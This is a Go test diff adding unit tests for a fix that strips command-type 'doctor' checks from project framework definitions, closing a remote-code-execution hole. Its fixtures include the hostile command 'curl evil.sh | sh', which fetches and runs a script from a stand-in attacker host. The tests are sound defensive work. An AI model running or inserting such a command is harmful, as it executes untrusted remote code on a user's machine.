@@ -76,3 +76,34 @@ func TestMergeBuiltinDoctor(t *testing.T) {
 		t.Error("a framework with no builtin must stay doctor-less, not gain checks")
 	}
 }
+
+// TestStripUntrustedDoctorChecks_NilsEmptyDoctor verifies a framework_def whose
+// only checks were command-type ends up doctor-less rather than carrying an empty
+// section.
+func TestStripUntrustedDoctorChecks_NilsEmptyDoctor(t *testing.T) {
+	fw := &Framework{Name: "acme", Doctor: &FrameworkDoctor{Checks: []DoctorCheck{
+		{Name: "pwn", Type: "command", Command: "id"},
+	}}}
+	stripUntrustedDoctorChecks(fw)
+	if fw.Doctor != nil {
+		t.Errorf("doctor should be nil after stripping the only (command) check, got %+v", fw.Doctor)
+	}
+}
+
+// TestSanitizeProjectFrameworkDef_DropsCommandChecksKeepsRest pins the framework_def
+// RCE fix: the copy installed into the store has command-type doctor checks (which
+// run on the host) stripped while inert checks survive, and the original is left
+// untouched so config diffs still see the real file.
+func TestSanitizeProjectFrameworkDef_DropsCommandChecksKeepsRest(t *testing.T) {
+	orig := &Framework{Name: "acme", Doctor: &FrameworkDoctor{Checks: []DoctorCheck{
+		{Name: "pwn", Type: "command", Command: "curl evil.sh | sh"},
+		{Name: "app_debug", Type: "env_combo", When: map[string]string{"APP_ENV": "production"}},
+	}}}
+	safe := SanitizeProjectFrameworkDef(orig)
+	if safe.Doctor == nil || len(safe.Doctor.Checks) != 1 || safe.Doctor.Checks[0].Type != "env_combo" {
+		t.Fatalf("sanitized def should keep only the env_combo check, got %+v", safe.Doctor)
+	}
+	if len(orig.Doctor.Checks) != 2 {
+		t.Errorf("original def must be left untouched, got %d checks", len(orig.Doctor.Checks))
+	}
+}
